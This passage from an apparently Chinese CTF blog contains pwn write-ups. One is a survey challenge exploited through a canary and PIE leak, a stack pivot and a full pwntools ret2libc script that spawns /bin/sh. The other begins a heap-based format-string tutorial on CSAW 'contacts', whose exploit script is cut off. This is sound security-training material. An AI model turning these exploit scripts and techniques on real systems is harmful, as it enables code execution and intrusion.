title="调试并编写exp"></a>调试并编写exp</h2><ol><li>由于开启了canary保护，我需要先泄露canary，利用canary最low一个byte恒为0，且canary恒在push rbp的上方，buf距离rbp0x12&#x3D;18，我们我们只需要10byte就可以到canary，再覆盖canary最low一个byte就可以利用printf(“You said: %s\n”, (const char *)&amp;buf);把canary输出出来，paylaod为b’a’*11,泄露canary的同时我们也泄露了保存的rbp，后面伪造栈帧时有用，泄露完之后我们在下一次read要填补上canary，进行下一下循环，getfeedback()</li><li>由于开启pie保护，我们还要泄露pie基址</li></ol><p><img src="/2023/02/16/23-2-16/image-20230216234031392.png" alt="image-20230216234031392"></p><p>b’a’*26泄露地址，减去elf处改地址即为pie基址，这里不用担心我们会覆盖canary，canary只有在该函数返回时，才会检测canary，</p><p><img src="/2023/02/16/23-2-16/image-20230216235350781.png" alt="image-20230216235350781"></p><p>下面还有一次read函数，这次read我们构造rop链，恢复canary</p><ol start="3"><li>在构造前我们先分析下win</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win函数汇编</span><br><span class="line">0x0000555555555249 &lt;+0&gt;:     endbr64 </span><br><span class="line">0x000055555555524d &lt;+4&gt;:     push   rbp</span><br><span class="line">0x000055555555524e &lt;+5&gt;:     mov    rbp,rsp</span><br><span class="line">0x0000555555555251 &lt;+8&gt;:     sub    rsp,0x70</span><br><span class="line">0x0000555555555255 &lt;+12&gt;:    mov    ecx,esi</span><br><span class="line">0x0000555555555257 &lt;+14&gt;:    mov    eax,edx</span><br><span class="line">0x0000555555555259 &lt;+16&gt;:    mov    edx,edi    ;很正常的64位程序寄存器传参，前6个参数从左向右rdi rsi rdx rcx r8 r9没办法干预</span><br><span class="line">0x000055555555525b &lt;+18&gt;:    mov    BYTE PTR [rbp-0x64],dl    f;这里开始开始把我们的参数往栈上转移，有可乘之机,</span><br><span class="line">0x000055555555525e &lt;+21&gt;:    mov    edx,ecx</span><br><span class="line">0x0000555555555260 &lt;+23&gt;:    mov    BYTE PTR [rbp-0x68],dl    l</span><br><span class="line">0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al   a       </span><br><span class="line">0x0000555555555266 &lt;+29&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555526f &lt;+38&gt;:    mov    QWORD PTR [rbp-0x8],rax            </span><br><span class="line">0x0000555555555273 &lt;+42&gt;:    xor    eax,eax</span><br><span class="line">0x0000555555555275 &lt;+44&gt;:    mov    QWORD PTR [rbp-0x4a],0x0    ;先把这几位置零</span><br><span class="line">0x000055555555527d &lt;+52&gt;:    mov    WORD PTR [rbp-0x42],0x0</span><br><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64];参数转移</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a;从这里倒推即可</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br><span class="line">0x00005555555552bf &lt;+118&gt;:   mov    QWORD PTR [rbp-0x58],rax</span><br><span class="line">0x00005555555552c3 &lt;+122&gt;:   cmp    QWORD PTR [rbp-0x58],0x0</span><br><span class="line">0x00005555555552c8 &lt;+127&gt;:   jne    0x5555555552e0 &lt;win+151&gt;</span><br><span class="line">0x00005555555552ca &lt;+129&gt;:   lea    rdi,[rip+0xd39]        # 0x55555555600a</span><br><span class="line">0x00005555555552d1 &lt;+136&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x00005555555552d6 &lt;+141&gt;:   mov    edi,0x1</span><br><span class="line">0x00005555555552db &lt;+146&gt;:   call   0x555555555150 &lt;exit@plt&gt;</span><br><span class="line">0x00005555555552e0 &lt;+151&gt;:   mov    QWORD PTR [rbp-0x40],0x0</span><br><span class="line">0x00005555555552e8 &lt;+159&gt;:   mov    QWORD PTR [rbp-0x38],0x0</span><br><span class="line">0x00005555555552f0 &lt;+167&gt;:   mov    QWORD PTR [rbp-0x30],0x0</span><br><span class="line">0x00005555555552f8 &lt;+175&gt;:   mov    QWORD PTR [rbp-0x28],0x0</span><br><span class="line">0x0000555555555300 &lt;+183&gt;:   mov    QWORD PTR [rbp-0x20],0x0</span><br><span class="line">0x0000555555555308 &lt;+191&gt;:   mov    QWORD PTR [rbp-0x18],0x0</span><br><span class="line">0x0000555555555310 &lt;+199&gt;:   mov    rdx,QWORD PTR [rbp-0x58]</span><br><span class="line">0x0000555555555314 &lt;+203&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555318 &lt;+207&gt;:   mov    esi,0x20</span><br><span class="line">0x000055555555531d &lt;+212&gt;:   mov    rdi,rax</span><br><span class="line">0x0000555555555320 &lt;+215&gt;:   call   0x555555555110 &lt;fgets@plt&gt;</span><br><span class="line">0x0000555555555325 &lt;+220&gt;:   lea    rax,[rbp-0x40]</span><br><span class="line">0x0000555555555329 &lt;+224&gt;:   mov    rdi,rax</span><br><span class="line">0x000055555555532c &lt;+227&gt;:   call   0x5555555550d0 &lt;puts@plt&gt;</span><br><span class="line">0x0000555555555331 &lt;+232&gt;:   nop</span><br><span class="line">0x0000555555555332 &lt;+233&gt;:   mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">0x0000555555555336 &lt;+237&gt;:   xor    rax,QWORD PTR fs:0x28</span><br><span class="line">0x000055555555533f &lt;+246&gt;:   je     0x555555555346 &lt;win+253&gt;</span><br><span class="line">0x0000555555555341 &lt;+248&gt;:   call   0x5555555550e0 &lt;__stack_chk_fail@plt&gt; ;检测canary</span><br><span class="line">0x0000555555555346 &lt;+253&gt;:   leave  </span><br><span class="line">0x0000555555555347 &lt;+254&gt;:   ret </span><br></pre></td></tr></table></figure><ol start="3"><li><p>我们把断点断到leave ret处  发现rbp指向就是我们ret的下方，如果我们把ret下方覆盖为fla的话，只需要把原来的栈提高0x6c,(0x0000555555555263 &lt;+26&gt;:    mov    BYTE PTR [rbp-0x6c],al )就可以伪造栈，伪造flag.txt，故payload为 <em>payload&#x3D;b’a’*10+p64(canary)+p64(rbp_ad+0x6c)+p64(win_ad)+b’a\x00\x00\x00’+b’l\x00\x00\x00’+b’f\x00\x00\x00’</em></p><p><img src="/2023/02/16/23-2-16/image-20230217000537025.png" alt="image-20230217000537025"></p></li></ol><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="再探"><a href="#再探" class="headerlink" title="再探"></a>再探</h2><p>官方的问题，前一个exp没打通，奇怪了，难道名字不叫flag.txt？，或许叫flag，又开始分析win汇编，我们可以直接控制栈和rsp,又从下面汇编的&lt;+62&gt;或者&lt;+99&gt;可以看出要打开的文件名字的存储地址为rbp-0x4a处，干嘛不直接覆盖这里，这样我们还可以控制文件名字</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0000555555555283 &lt;+58&gt;:    movzx  eax,BYTE PTR [rbp-0x64]            ;参数转移</span><br><span class="line">0x0000555555555287 &lt;+62&gt;:    mov    BYTE PTR [rbp-0x4a],al    f</span><br><span class="line">0x000055555555528a &lt;+65&gt;:    movzx  eax,BYTE PTR [rbp-0x68]    </span><br><span class="line">0x000055555555528e &lt;+69&gt;:    mov    BYTE PTR [rbp-0x49],al    l</span><br><span class="line">0x0000555555555291 &lt;+72&gt;:    movzx  eax,BYTE PTR [rbp-0x6c]  a        ;从这里倒推即可</span><br><span class="line">0x0000555555555295 &lt;+76&gt;:    mov    BYTE PTR [rbp-0x48],al</span><br><span class="line">0x0000555555555298 &lt;+79&gt;:    mov    BYTE PTR [rbp-0x47],0x67        </span><br><span class="line">0x000055555555529c &lt;+83&gt;:    mov    BYTE PTR [rbp-0x46],0x2e</span><br><span class="line">0x00005555555552a0 &lt;+87&gt;:    mov    BYTE PTR [rbp-0x45],0x74</span><br><span class="line">0x00005555555552a4 &lt;+91&gt;:    mov    BYTE PTR [rbp-0x44],0x78</span><br><span class="line">0x00005555555552a8 &lt;+95&gt;:    mov    BYTE PTR [rbp-0x43],0x74</span><br><span class="line">0x00005555555552ac &lt;+99&gt;:    lea    rax,[rbp-0x4a]</span><br><span class="line">0x00005555555552b0 &lt;+103&gt;:   lea    rsi,[rip+0xd51]        # 0x555555556008</span><br><span class="line">0x00005555555552b7 &lt;+110&gt;:   mov    rdi,rax</span><br><span class="line">0x00005555555552ba &lt;+113&gt;:   call   0x555555555140 &lt;fopen@plt&gt;</span><br></pre></td></tr></table></figure><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><p>把前一个exp的</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">win_ad=<span class="number">0x1273</span>+base</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x6c</span>)+p64(win_ad)+<span class="string">b&#x27;a\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;l\x00\x00\x00&#x27;</span>+<span class="string">b&#x27;f\x00\x00\x00&#x27;</span></span><br><span class="line">替换为</span><br><span class="line">win_ad=<span class="number">0x012AC</span>+base </span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+p64(rbp_ad+<span class="number">0x4a</span>)+p64(win_ad)+<span class="string">b&#x27;flag.txt\x00&#x27;</span> <span class="comment">#flag.txt文件名字可以改成我们想打开的名字</span></span><br></pre></td></tr></table></figure><h2 id="很生气呀，拿tm的shell"><a href="#很生气呀，拿tm的shell" class="headerlink" title="很生气呀，拿tm的shell"></a>很生气呀，拿tm的shell</h2><p>本地也通了，远程还是不行，试了好几个文件名字还不行，内心开始怀疑，也不想就这样放弃，继续分析发现可以直接拿shell</p><p>和前面一样先泄露canary rbp 和pie基址，程序有使用puts函数，我们可以利用puts泄露puts地址，由于是64为需要一个pop rdi的gadget给puts传参</p><p><img src="/2023/02/16/23-2-16/image-20230217002642059.png" alt="image-20230217002642059"></p><p>payload&#x3D;b’a’*10+p64(canary)+b’deadbeef’+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</p><p>这里再次返回canary是不会变得，即使是再次生成；变了的话也好说，在泄露一次就是了，或者rop返回时跳过生成</p><p>泄露后找到libc，就可以常规rop</p><p>payload&#x3D;b’a’*10+p64(canary)+b’deadbeef’+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</p><p>这里在ret到system前多个ret是为了ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</p><blockquote><p>64位下system函数有个movaps指令，这个指令要求内存地址必须16字节对齐,因为64位程序的地址是8字节的，而十六进制又是满16就会进位，因此我们看到的栈地址末尾要么是0要么是8。</p><p>只有当地址的末尾是0的时候，才算是与16字节对齐了，如果末尾是8的话，那就是没有对齐。而我们想要在ubuntu18以上的64位程序中执行system函数，必须要在执行system栈顶地址末尾是0。</p></blockquote><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b* $rebase(0x138E)&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span></span><br><span class="line">io.sendafter(<span class="string">b&#x27;like ctf?&#x27;</span>,padding)</span><br><span class="line"><span class="comment"># print(io.recv())</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">11</span>)</span><br><span class="line">canary=u64(io.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">rbp_ad=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rbp_ad))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary))</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;ete a survey?&#x27;</span>,<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;Do you like ctf?&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">ret_ad=<span class="number">0x1447</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;a&#x27;</span>*<span class="number">26</span>)</span><br><span class="line">base=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-ret_ad</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;base:&quot;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line"><span class="comment"># print(&quot;base&quot;+hex(base))</span></span><br><span class="line">poprdi=<span class="number">0x014d3</span>+base</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]+base</span><br><span class="line">getFeedback=base+elf.symbols[<span class="string">&#x27;getFeedback&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_plt))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(getFeedback))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(puts_got)+p64(puts_plt)+p64(getFeedback)</span><br><span class="line">io.sendafter(<span class="string">b&#x27;extra feedback?&#x27;</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">puts_ad=u64(io.recv()[<span class="number">0</span>:<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;puts_ad&quot;</span>+<span class="built_in">hex</span>(puts_ad))</span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">base_libc=puts_ad-libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line"><span class="comment"># base_libc=puts_ad-0x067970</span></span><br><span class="line">system_ad=base_libc+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="comment"># system_ad=base_libc+0x03f650</span></span><br><span class="line">bin_sh=base_libc+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"><span class="comment"># bin_sh=base_libc+0x163ef7</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line">ret=base+<span class="number">0x0101a</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system&quot;</span>+<span class="built_in">hex</span>(system_ad))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin&quot;</span>+<span class="built_in">hex</span>(bin_sh))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;ret&quot;</span>+<span class="built_in">hex</span>(ret))</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">10</span>+p64(canary)+<span class="string">b&#x27;deadbeef&#x27;</span>+p64(poprdi)+p64(bin_sh)+p64(ret)+p64(system_ad)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;Can you provide some extra feedback?\n&quot;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>拿到shell，发现文件里有flag.txt，拿到flag，还在疑惑前两个为什么不行，又去试了一下前两个exp，这次发现都能打通，我….</p><h2 id="总结-有得有失"><a href="#总结-有得有失" class="headerlink" title="总结:有得有失"></a>总结:有得有失</h2>]]></content>
      
      
      
        <tags>
            
            <tag> ROP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>非栈上的格式化字符串漏洞</title>
      <link href="/2023/02/12/pwn/"/>
      <url>/2023/02/12/pwn/</url>
      
        <content type="html"><![CDATA[<h1 id="格式化字符串漏洞点不在栈上怎么打"><a href="#格式化字符串漏洞点不在栈上怎么打" class="headerlink" title="格式化字符串漏洞点不在栈上怎么打"></a>格式化字符串漏洞点不在栈上怎么打</h1><p><strong>一般在栈上的格式会字符串漏洞，我们可以先泄露导致格式化字符串漏洞的函数的got表，然后利用%$hhn进行一个一个byte的写入，payload自己可以写函数去生成，或者利用pwntools库的fmtstr_payload(,{:})去自动生成，自己构造payload要注意payload是否有被‘\x00’截断，导致利用不成功，这种方法需要我们可控值是存储在栈上的参数，不在栈上时应该怎么办？介绍两种方法</strong></p><span id="more"></span><h2 id="第一种方法-将栈顶esp-rsp-提升到可控参数-进行rop"><a href="#第一种方法-将栈顶esp-rsp-提升到可控参数-进行rop" class="headerlink" title="第一种方法 将栈顶esp(rsp)提升到可控参数 进行rop"></a>第一种方法 将栈顶esp(rsp)提升到可控参数 进行rop</h2><p><strong>题目链接<a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/fmtstr/2015-CSAW-contacts">contacts</a></strong></p><h3 id="拿到题目运行"><a href="#拿到题目运行" class="headerlink" title="拿到题目运行"></a>拿到题目运行</h3><p><img src="/2023/02/12/pwn/image-20230212164452297.png" alt="image-20230212164452297"></p><h3 id="查看保护"><a href="#查看保护" class="headerlink" title="查看保护"></a>查看保护</h3><p><img src="/2023/02/12/pwn/image-20230212164600939.png" alt="image-20230212164600939"></p><h3 id="开始ida反汇编静态分析"><a href="#开始ida反汇编静态分析" class="headerlink" title="开始ida反汇编静态分析"></a>开始ida反汇编静态分析</h3><p>主函数就是一下简单switch，PrintInfo发现有我们可控参数，format是我们输入的Description，但是很遗憾在堆上(可以看到是利用malloc在堆上申请)，源程序应该是个c的结构体</p><p><img src="/2023/02/12/pwn/image-20230212164835416.png" alt="image-20230212164835416"></p><p><img src="/2023/02/12/pwn/image-20230212170204473.png" alt="image-20230212170204473"></p><p>这是我们的思路可能在想可不可以改写printf的got为system地址，让后控制format为‘&#x2F;bin&#x2F;sh’从而获取shell，很遗憾不可以，参数没在栈上，可不可以利用改写返回地址为system_addr + ‘fake’ + addr of ‘&#x2F;bin&#x2F;sh‘ ，思想可行，由于改写过程需要大量输出，行为不可行，但是思想终归是正确的，我们是否可以把system_addr + ‘fake’ + addr of ‘&#x2F;bin&#x2F;sh‘输入到description，再利用格式化字符串漏洞，把main函数返回时保存的ebp给为堆上description地址，是可行的</p><h3 id="gdb动态调试写exp"><a href="#gdb动态调试写exp" class="headerlink" title="gdb动态调试写exp"></a>gdb动态调试写exp</h3><p>没有开pie保护，直接b *0x8048C22把断点下到漏洞处分析</p><p><img src="/2023/02/12/pwn/image-20230212173223423.png" alt="image-20230212173223423"></p><p>观察栈里的参数1处为PrintInfo函数保存的ebp地址，2处为description堆上地址，3处为__libc_start_call_main调用函数时保存的返回地址，利用fmtarg得到各格式化参数偏移，接下来我们的思路就很明确了</p><ol><li>利用%31$paaaa 泄露__libc_start_call_main，让后利用Libcsearch泄露版本号（ASLR保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变，原因是以页的大小为基础随机，linux一般4k），从而dump下libc里的system地址和&#x2F;bin&#x2F;sh地址，这里由于不知名原因导致__libc_start_call_main不行，脚本里换成了根据偏移libc_start_main地址，本地练习无所谓</li><li>b’%6$p%11$pbbb’+p32(system)+b’fake’+p32(bin_sh)泄露description地址和ebp，同时写入rop需要成分</li><li>b’%’+str(heap_addr-4).encode()+b’c’+b’%6$n’向main函数ebp写入description堆地址<ul><li>程序中压入栈中的 ebp 值其实保存的是上一个函数的保存 ebp 值的地址，利用%n修改的又是地址里的内容，所以我们修改的是上上级函数ebp，也就是main</li><li>为什么heap_addr需要-4，我们观察反汇编发现main函数利用leave 和 ret 来恢复堆栈和执行，leave也就等效于mov esp,ebp ；pop ebp恢复，在leave esp，ebp时堆栈已经提升到堆，pop ebp 会ebp+4，所以我们需要进行-4留出给fake ebp</li></ul></li><li>然后我们退出main函数就可以拿到shell</li></ol><h3 id="完整exp如下"><a href="#完整exp如下" class="headerlink" title="完整exp如下"></a>完整exp如下</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./contacts&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(pwnfile)</span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:success(x+<span class="string">&#x27;--&gt;&#x27;</span>+<span class="built_in">hex</span>(y))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">createcontact</span>(<span class="params">name, phone, descrip_len, description</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contact info: \n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Name: &#x27;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;You have 10 numbers\n&#x27;</span>)</span><br><span class="line">    io.sendline(phone)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Length of description: &#x27;</span>)</span><br><span class="line">    io.sendline(descrip_len)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;description:\n\t\t&#x27;</span>)</span><br><span class="line">    io.sendline(description)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printcontact</span>():</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Contacts:&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;Description: &#x27;</span>)</span><br><span class="line"><span class="comment"># db(&#x27;b *0x8048C1F&#x27;)</span></span><br><span class="line">payload = <span class="string">&#x27;%31$paaaa&#x27;</span></span><br><span class="line">createcontact(<span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;1111&#x27;</span>, <span class="string">b&#x27;111&#x27;</span>, payload)</span><br><span class="line">printcontact()</span><br><span class="line">__libc_start_call_main=<span class="built_in">int</span>(ru(<span class="string">b&#x27;aaaa&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&#x27;get libc_start_main_ret addr: &#x27;</span> + <span class="built_in">hex</span>(__libc_start_call_main))</span><br><span class="line">__libc_start_main=__libc_start_call_main+<span class="number">0x3B</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;__libc_start_main&#x27;</span>,__libc_start_main)</span><br><span class="line">base=__libc_start_main-libc.dump(<span class="string">&#x27;__libc_start_main&#x27;</span>)</span><br><span class="line">p(<span 